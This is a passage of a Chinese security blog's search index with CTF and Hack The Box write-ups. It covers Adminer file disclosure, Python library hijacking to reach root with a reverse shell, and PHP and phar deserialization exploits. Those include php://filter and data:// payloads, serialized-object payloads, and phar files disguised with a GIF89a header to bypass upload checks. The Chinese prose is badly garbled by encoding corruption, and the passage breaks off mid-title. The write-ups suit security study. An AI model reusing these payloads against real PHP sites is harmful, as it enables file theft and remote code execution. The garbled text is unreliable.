ä¸‹è½½dump.sqlæ–‡ä»¶å’Œhtml.tar.gzå¹¶è§£å‹ utility-scriptsç›®å½•ä¸­æœ‰MySQLçš„ç™»å½•åå’Œå¯†ç  wfuzzutility-scriptsç›®å½•å‘ç° adminer.php ä¸Šé¢ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ç™»å½•adminer Googleå‘ç°ä¸€ä¸ªadmineræ¼æ´çš„å…¬å¼€åˆ©ç”¨æ–¹å¼ åœ¨æœ¬åœ°è¿è¡ŒMySQLæœåŠ¡ï¼Œå¹¶ä¸”æ–°å»ºç”¨æˆ·å…è®¸ä»»æ„ä¸»æœºæ¥å…¥ï¼Œé…ç½®MySQLå¤–éƒ¨å¯è®¿é—® ç”¨é¶æœºçš„admineræœåŠ¡è¿æ¥æœ¬åœ°æ•°æ®åº“ å°†index.phpå†™å…¥æœ¬åœ°æ•°æ®åº“ å¾—åˆ°waldoçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨SSHç™»å½• æ‹¿åˆ°user.txt è¿è¡Œsudo -lå‘½ä»¤ï¼ŒæŸ¥çœ‹æœ‰æƒé™æ‰§è¡Œçš„è„šæœ¬admin_task.sh admin_task.shä¼šè°ƒç”¨backup.py Python library path hijacking ææƒ ä¼ªé€ shutil.pyï¼Œå†™å…¥reverse shell sudoè¿è¡Œadmin_task.shæ—¶æŒ‡å®š PYTHONPATH æ‹¿åˆ° root.txt 0x05 Reference Topic Url Adminer-database Manager https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool Adminer-Database Manager https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability Configuration of Mysql https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql Configuration of Mysql https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql Python Path Hijacting https://rastating.github.io/privilege-escalation-via-python-library-hijacking/","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"PHPååºåˆ—åŒ–å­¦ä¹ -CTFå®æˆ˜ç¯‡","date":"2020-05-14T00:19:57.000Z","path":"Web_security/php_related/7.PHPååºåˆ—åŒ–å­¦ä¹ -CTFå®æˆ˜ç¯‡/","text":"PHPååºåˆ—åŒ–å­¦ä¹ ä¹‹CTFå®æˆ˜ç¯‡ ç½‘é¼æ¯2020 AreUserialz é¢˜ç›®åœ°å€ï¼šhttps://buuoj.cn/challenges é¢˜ç›®ç›´æ¥ç»™å‡ºæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; å¼±ç±»å‹æ¯”è¾ƒ åˆ†ææºç å‘ç°å¯ä»¥è°ƒç”¨çš„é­”æœ¯æ–¹æ³•åªæœ‰__destructã€‚è€Œ$op=2å¯ä»¥è¯»æ–‡ä»¶ï¼Œ$op=1å¯ä»¥å†™æ–‡ä»¶ï¼Œä½†æ˜¯å®ƒæŠŠ$contentè®¾ç½®ä¸º0è¯´æ˜å†™è¿™ä¸ªæ“ä½œæ˜¯ç»å¯¹å®ç”¨ä¸äº†äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠç›®å…‰æ”¾åœ¨è¯»æ–‡ä»¶ä¸Šã€‚ 123456if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;;else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res);&#125; ç›´æ¥å¼±ç±»å‹æ¯”è¾ƒè®¾ç½®$op=2å°±å®Œäº‹äº†ã€‚ç„¶åæœ¬æ¥ä»¥ä¸ºå¯ä»¥ç›´æ¥æ„é€ popé“¾å¼€å§‹è¯»æ–‡ä»¶çš„ã€‚ä½†æ˜¯é‡åˆ°äº†ä¸‹é¢çš„å‡½æ•°ï¼š 123456function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125; æœ¬æ¥è¿™é‡Œæ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯å› ä¸ºä½ çš„å˜é‡æ˜¯protectedç±»å‹çš„ï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿ%00å­—ç¬¦ï¼Œä»è€Œå¯¼è‡´ç»•è¿‡å¤±è´¥ã€‚ ç»•è¿‡is_valid() è¿™é‡Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼š 1.å¯ä»¥å°†protectedç±»å‹çš„å˜é‡è®¾ç½®ä¸ºpublicç±»å‹ï¼ˆPHP 7.0ä»¥ä¸Šï¼‰ 12345678910&lt;?phpclass FileHandler&#123; public $op = 2; public $filename = &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;; public $content;&#125;$a = new FileHandler();$b = serialize($a);echo $b; 2.ååºåˆ—åŒ–ä¹‹å‰ä¼šåšé€å­—åˆ¤æ–­ï¼Œasciiå¿…é¡»&gt;=32æˆ–&lt;=125ã€‚ç”±äºè¿™é‡Œæ˜¯protectedç±»å‹ï¼Œéœ€è¦åŠ ä¸Š%00è¿›è¡Œæ ‡è¯†ï¼Œä½†æ˜¯%ä¼šè¢«è¿‡æ»¤ï¼Œå°±ç”¨åå…­è¿›åˆ¶\\00å’ŒSæ¥ç»•è¿‡ã€‚ 1234567891011&lt;?phpclass FileHandler &#123; protected $op = 2; protected $filename = &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;; protected $content;&#125;$a = new FileHandler();$b = urlencode(serialize($a));echo $b; ç„¶åå°†payloadä¸­çš„%00æ›¿æ¢ä¸º\\00ï¼Œsæ›¿æ¢ä¸ºSå°±è¡Œäº† 1O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;s:11:&quot;\\00*\\00filename&quot;;s:71:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;S:10:&quot;\\00*\\00content&quot;;N;&#125; ä½†æ˜¯ç”¨è¿™ç§æ–¹æ³•ä¸èƒ½åœ¨https://www.ctfhub.com/#/challengeé¶æœºä¸Šè§£é¢˜ï¼Œä¹Ÿæ‹¿ä¸åˆ°webç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå…ˆç•™ä¸ªå‘ã€‚ ZJCTF2019 é€†è½¬æ€ç»´ é¢˜ç›®åœ°å€ï¼šhttps://www.ctfhub.com/#/challenge ç›´æ¥ç»™å‡ºæºç ï¼š 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; file_get_contentsç»•è¿‡ æœ‰ä¸¤ç§æ–¹å¼ç»•è¿‡ï¼š ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡ â‘  å°†è¦GETçš„å‚æ•°?xxx=php://input â‘¡ ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼ ç”¨data://ä¼ªåè®®ç»•è¿‡ å°†urlæ”¹ä¸ºï¼š?xxx=data://text/plain;base64ï¼Œæƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç  æˆ–è€…å°†urlæ”¹ä¸ºï¼š?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹) 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D; è¯»å–useless.php é¢˜ç›®æœ‰ç¬¬äºŒä¸ªå‚æ•°fileï¼Œå¤§æ¦‚æ˜¯include()è¿™ä¸ªfileï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬è¦åŒ…å«useless.phpï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªåˆ¤æ–­æ˜¯fileå‚æ•°ä¸èƒ½ä¼ å…¥flagï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥åŒ…å«flag.phpã€‚ åˆ©ç”¨php://filteråè®®è¯»å–è¿™ä¸ªuseless.phpï¼Œæ„é€ payloadè¯»å–useless.phpï¼š 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php useless.php 123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;HAHAHAHAHA&quot;); &#125; &#125; &#125; ååºåˆ—åŒ– useless.phpçš„é­”æœ¯æ–¹æ³•æ˜¯__toString()ï¼Œåˆšå¥½å¯ä»¥ä½¿ç”¨echo $passwordè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ã€‚ ç”Ÿæˆpayloadï¼š 123456class Flag&#123; public $file = &quot;flag.php&quot;;&#125;$o = new Flag();$s = serialize($o);echo $s; payloadï¼š 1?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; ç»¼åˆèµ·æ¥çš„payloadå°±æ˜¯ï¼š 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; ByteCTF2019 ezcms é¢˜ç›®åœ°å€ï¼šhttps://www.ctfhub.com/#/challenge","tags":[],"categories":[]},{"title":"PHPååºåˆ—åŒ–å­¦ä¹ -Pharååºåˆ—åŒ–","date":"2020-05-09T02:32:28.000Z","path":"Web_security/php_related/3.PHPååºåˆ—åŒ–å­¦ä¹ -pharååºåˆ—åŒ–/","text":"PHPååºåˆ—åŒ–å­¦ä¹ â€”â€”Pharååºåˆ—åŒ– PharåŸç† pharçš„æœ¬è´¨æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ Phar demo æ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œã€‚ è¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚ phar.php 1234567891011121314&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$o = new TestObject();$o-&gt;data = &#x27;ca01h&#x27;;$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering(); è®¿é—®å,ä¼šç”Ÿæˆä¸€ä¸ªphar.pharåœ¨å½“å‰ç›®å½•ä¸‹ã€‚ å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ã€‚ æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼ŒçŸ¥é“åˆ›å®‡æµ‹è¯•åå—å½±å“çš„å‡½æ•°åˆ—è¡¨ï¼š å°±ç”¨æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°file_get_contents()å‡½æ•°ä¸¾ä¾‹ï¼š 12345678&lt;?phpclass TestObject&#123; function __destruct() &#123; echo $this -&gt; data; // TODO: Implement __destruct() method. &#125;&#125;file_get_contents(&#x27;phar://phar.phar/test.txt&#x27;); è‡³äºä¸ºä»€ä¹ˆè¿™äº›å‡½æ•°åœ¨è§£æpharæ–‡ä»¶æ—¶ä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå¯ä»¥çœ‹ä¸€ä¸‹zsfå¸ˆå‚…çš„æ·±å±‚æ¬¡å‰–æï¼š https://blog.zsxsoft.com/post/38 åœ¨è·Ÿè¸ªäº†å—å½±å“å‡½æ•°çš„è°ƒç”¨æƒ…å†µåå‘ç°ï¼Œé™¤äº†æ‰€æœ‰æ–‡ä»¶å‡½æ•°ï¼Œåªè¦æ˜¯å‡½æ•°çš„å®ç°è¿‡ç¨‹ç›´æ¥æˆ–é—´æ¥è°ƒç”¨äº†php_stream_open_wrapperï¼Œéƒ½å¯èƒ½è§¦å‘pharååºåˆ—åŒ–æ¼æ´ã€‚ å°†Pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯__HALT_COMPILER();?&gt;è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚ 123456789101112&lt;?php class TestObject &#123; &#125; $phar = new Phar(&#x27;img.phar&#x27;); $phar -&gt; startBuffering(); $phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ $phar -&gt;addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $object = new TestObject(); $object -&gt; data = &#x27;ca01h&#x27;; $phar -&gt; setMetadata($object); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest $phar -&gt; stopBuffering();?&gt; é‡‡ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¼ æ£€æµ‹ã€‚ Pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ æ¼æ´åˆ©ç”¨æ¡ä»¶ pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ Pharç®€å•åˆ©ç”¨ index.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;upload file&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; upload.php ä»…å…è®¸æ ¼å¼ä¸ºgifçš„æ–‡ä»¶ä¸Šä¼ ã€‚ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ä¼šå­˜å‚¨åˆ°upload_fileç›®å½•ä¸‹ã€‚ 123456789101112131415161718192021&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;else &#123; echo &quot;Invalid file,you can only upload gif&quot;; &#125; evil.php 1234567891011&lt;?phpclass TestObject&#123; var $data = &#x27;echo &quot;Hello World&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; data); &#125;&#125;if ($_GET[&quot;file&quot;])&#123; file_exists($_GET[&quot;file&quot;]);&#125; ç»•è¿‡æ€è·¯ï¼šGIFæ ¼å¼éªŒè¯å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ GIF89aç»•è¿‡ã€‚ ç”¨ä¸‹é¢çš„ä»£ç ç”Ÿæˆpharæ–‡ä»¶ 1234567891011&lt;?phpclass TestObject&#123;&#125;$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new TestObject();$o-&gt;data = &quot;phpinfo()&quot;;$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); ç”Ÿæˆçš„phar.pharä¿®æ”¹åç¼€åphar.gifï¼Œå†ä¸Šä¼ è¯¥æ–‡ä»¶ï¼Œç”¨pharåè®®è§£æï¼š Pharååºåˆ—åŒ–å®ä¾‹ [HITCON 2017]Baby^h Master PHP æˆ‘ä»¬å…ˆçœ‹çœ‹Orange åœ¨ 2017 å¹´ hitcon ä¸Šé¢å‡ºçš„åˆ©ç”¨ Phar è¿›è¡Œååºåˆ—åŒ–ï¼Œæ¯•ç«Ÿè¿™æ˜¯ç¬¬ä¸€æ¬¡å‡ºç°è¿™ç§åˆ©ç”¨æ–¹å¼çš„åœ°æ–¹ï¼Œåº”è¯¥æ¥è¯´æ˜¯æœ€ç»å…¸çš„åˆ©ç”¨åœºæ™¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?php // å¾—åˆ° flag çš„åŒ¿åå‡½æ•° $FLAG = create_function(&quot;&quot;, &#x27;die(`/read_flag`);&#x27;); $SECRET = `/read_secret`; // æ ¹æ® remote_addr ç»™æ¯ä¸ªäººåˆ›å»ºä¸€ä¸ªæ²™ç›’ $SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($SANDBOX); @chdir($SANDBOX); if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET); //å°†æ¯ä¸ªäººå”¯ä¸€çš„æ²™ç›’å¯¹è±¡åŠ ä¸Šç­¾ååä½œä¸º session-data setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac)); &#125; class User &#123; public $avatar; function __construct($path) &#123; //è®¾ç½®äº†å¤´åƒçš„è·¯å¾„ä¸ºæ²™ç›’è·¯å¾„ $this-&gt;avatar = $path; &#125; &#125; class Admin extends User &#123; function __destruct()&#123; $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function my_function_$random() &#123;&quot; .&quot; global \\$FLAG; \\$FLAG();&quot; /*ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡å°±èƒ½åˆ›å»ºä¸€ä¸ªéšæœºåå­—çš„å‡½æ•°ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°å°±èƒ½è°ƒç”¨ flagï¼Œå®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªéª—å±€ï¼ŒåŒ¿åå‡½æ•°ä¹Ÿæ˜¯æœ‰åå­—çš„*/ .&quot;&#125;&quot;); $_GET[&quot;lucky&quot;](); &#125; &#125;//åˆ¤æ–­èº«ä»½ï¼Œå¦‚æœèº«ä»½æ­£ç¡®è¿”å›å¤´åƒè·¯å¾„(æ²™ç›’è·¯å¾„)//è¯¥å‡½æ•°ä¸å¯ç»•è¿‡ function check_session() &#123; global $SECRET; $data = $_COOKIE[&quot;session-data&quot;]; list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) die(&quot;Bye&quot;); if ( !hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac) ) die(&quot;Bye Bye&quot;); $data = unserialize($data); if ( !isset($data-&gt;avatar) ) die(&quot;Bye Bye Bye&quot;); return $data-&gt;avatar; &#125;//è·å–å¤´åƒï¼Œæ£€æŸ¥å¤´æ˜¯å¦ä¸ºGIF89a ï¼Œæ­£ç¡®åå­˜å…¥æ²™ç›’ function upload($path) &#123; $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); //è¿™ä¸ªå°±æ˜¯åˆ©ç”¨ phar:// è¿›è¡Œååºåˆ—åŒ–çš„ç‚¹ if (substr($data, 0, 6) !== &quot;GIF89a&quot;) die(&quot;Fuck off&quot;); file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;); &#125;//è·å–è¿™ä¸ªæ²™ç›’ä¸­çš„å¤´åƒ function show($path) &#123; if ( !file_exists($path . &quot;/avatar.gif&quot;) ) $path = &quot;/var/www/html&quot;; header(&quot;Content-Type: image/gif&quot;); die(file_get_contents($path . &quot;/avatar.gif&quot;)); &#125;$mode = $_GET[&quot;m&quot;];if ($mode == &quot;upload&quot;) upload(check_session());else if ($mode == &quot;show&quot;) show(check_session());else highlight_file(__FILE__); è¿™é“é¢˜å¾ˆæ˜ç¡®å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„é¢˜ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯é€šè¿‡ååºåˆ—åŒ– Admin è¿™ä¸ªç±»å¾—åˆ°æˆ‘ä»¬çš„ flagã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åˆ©ç”¨ unserailize() ï¼Œé€šè¿‡æ§åˆ¶å…¶å‚æ•°å»å®ç°æˆ‘ä»¬çš„ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å°±å¿…é¡»ç»•è¿‡å¯¹ cookie çš„æ£€æµ‹ï¼Œä½†æ˜¯cookie æ˜¯é€šè¿‡ remote_addr é…åˆ sha1 è¿›è¡Œ hmac ç­¾åç”Ÿæˆçš„ï¼Œæƒ³ç»•è¿‡ä»–é‚£æ˜¯ä¸å¯èƒ½çš„ã€‚ç°åœ¨æˆ‘ä»¬å°±è¦æ€è€ƒä¸€ä¸‹ æ˜¯ä¸æ˜¯èƒ½ç”¨ Phar è¿™ä¸ªåœ¨ä¸ä½¿ç”¨ unserialize() çš„æ–¹å¼å®Œæˆåºåˆ—åŒ–æˆåŠŸ get flagï¼Œç„¶åæˆ‘ä»¬å°±çœ‹åˆ°äº†è¿™ä¸ªå‡½æ•°ï¼š 1234567function upload($path) &#123; $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); if (substr($data, 0, 6) !== &quot;GIF89a&quot;) die(&quot;Fuck off&quot;); file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;);&#125; æˆ‘ä»¬åªè¦çš„ç²¾å¿ƒæ„é€ ä¸€ä¸ªåŒ…å« Admin å¯¹è±¡ã€åŒ…å« avatar.gif æ–‡ä»¶ï¼Œå¹¶ä¸” stub æ˜¯ GIF89a çš„ phar æ–‡ä»¶ç„¶åä¸Šä¼ ä¸Šå»ï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚é€šè¿‡ Phar:// åè®®è®© file_get_contents è¯·æ±‚è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥å®ç°æˆ‘ä»¬å¯¹ Admin å¯¹è±¡çš„ååºåˆ—åŒ–äº†ã€‚ 12345678910&lt;?phpclass Admin &#123; public $avatar = &#x27;orz&#x27;; &#125; $p = new Phar(__DIR__ . &#x27;/avatar.phar&#x27;, 0);$p[&#x27;file.php&#x27;] = &#x27;&lt;?php ?&gt;&#x27;;$p-&gt;setMetadata(new Admin());$p-&gt;setStub(&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);rename(__DIR__ . &#x27;/avatar.phar&#x27;, __DIR__ . &#x27;/avatar.gif&#x27;);?&gt; ä¹‹åä¼šåˆ©ç”¨åŒ¿åå‡½æ•°ç”Ÿæˆå‡½æ•°åçš„ç‰¹ç‚¹ï¼Œè¿™é‡Œå°±ä¸å¤šå™è¿°ã€‚ è¿™é“é¢˜æˆ‘åœ¨BUUä¸Šé¢ä¸€ç›´æ²¡æœ‰å¤ç°æˆåŠŸï¼Œå¡åœ¨ä¸Šä¼ pharæ–‡ä»¶ï¼Œä¸€ç›´å›æ˜¾fuck offï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæœ‰çŸ¥é“çš„å¸ˆå‚…å¯ä»¥èµæ•™ä¸€ä¸‹ã€‚ [LCTF2018] T4lk 